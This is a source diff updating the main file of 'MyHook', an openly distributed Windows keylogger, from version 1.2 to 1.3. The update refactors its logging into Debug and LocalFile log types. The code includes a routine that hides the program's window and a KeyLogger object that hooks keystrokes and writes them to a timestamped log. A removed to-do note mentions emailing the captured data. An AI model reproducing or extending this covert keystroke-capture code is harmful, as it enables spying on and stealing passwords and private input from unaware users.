@@ -1,12 +1,10 @@
 /**
   * @file myhook.cpp
-  * @date May 1, 2009
+  * @date July 29, 2009
   * @author Daniel Amodio, Patrick Servello
   *
-  * MyHook 1.2
+  * MyHook 1.3
   * Origional Code and Concept Copyright 2008 Daniel Amodio (deige101)
-  * Created for Major League Coding
-  * http://groups.myspace.com/MajorLeagueCoding
   *
   * This program is free software: you can redistribute it and/or modify
   * it under the terms of the GNU General Public License as published by
@@ -26,12 +24,8 @@
 /*
     TENATIVE UPDATES
 
-    *add support for command line paramaters that let the app react different
-        could optionaly email data, or could run in debug mode, etc
-    *add abstract class for different ways to catch data.
     
     CHANGELOG
-    Implemented Class design
 
 */
 
@@ -39,8 +33,13 @@
 #include <windows.h>
 #include <time.h>
 #include <string>
-#include "DataLog.h"
+#include "LogType.h"
 #include "KeyLogger.h"
+
+// Include Log Types
+#include "Debug.h"
+#include "LocalFile.h"
+
 
 /**
   * HIDDEN: Variable to determine visible state of application
@@ -61,7 +60,7 @@ const LogTypeName LOG_MODE = DEBUG;
 
 bool myHookIsRunning();
 void hideMe();
-void startLog(DataLog datalog);
+void startLog(LogType &newDatalog);
 
 int main (void)
 {
@@ -74,13 +73,27 @@ int main (void)
        hideMe();
        
     // Create DataLog object. Current LogTypes are DEBUG and LOCAL_FILE
-    DataLog datalog(LOG_MODE);
+    //DataLog datalog(LOG_MODE);
+    // explain this later
+    LogType *datalog;
+    
+    switch(LOG_MODE)
+    {
+        case DEBUG:
+              datalog = new Debug();
+              break;
+        case LOCAL_FILE:
+              datalog = new LocalFile();
+              break;
+        default:
+                ;
+    }
     
     // Add initial data to the log
-    startLog(datalog);
+    startLog(*datalog);
     
-    // Create KeyLogger object, and pass DataLog object
-    KeyLogger keylog(datalog);
+    // Create KeyLogger object, and pass LogType object
+    KeyLogger keylog(*datalog);
     
     // Pass control to KeyLoggerObject
     keylog.hookIt();
@@ -122,12 +135,12 @@ void hideMe(void)
 /**
   * Method to add a timestamp to the data log
   */
-void startLog(DataLog datalog)
+void startLog(LogType &newDatalog)
 {
      time_t ltime;
      ltime=time(NULL);
-     datalog.log("\n\n------------------------------------------------------------------------");
-     datalog.log("\n\t\t\tMyHook Session\t");
-     datalog.log(asctime(localtime(&ltime))); // Add timestamp to data log
-     datalog.log("------------------------------------------------------------------------\n");
-}   
+     newDatalog.log("\n\n------------------------------------------------------------------------");
+     newDatalog.log("\n\t\t\tMyHook Session\t");
+     newDatalog.log(asctime(localtime(&ltime))); // Add timestamp to data log
+     newDatalog.log("------------------------------------------------------------------------\n");
+}
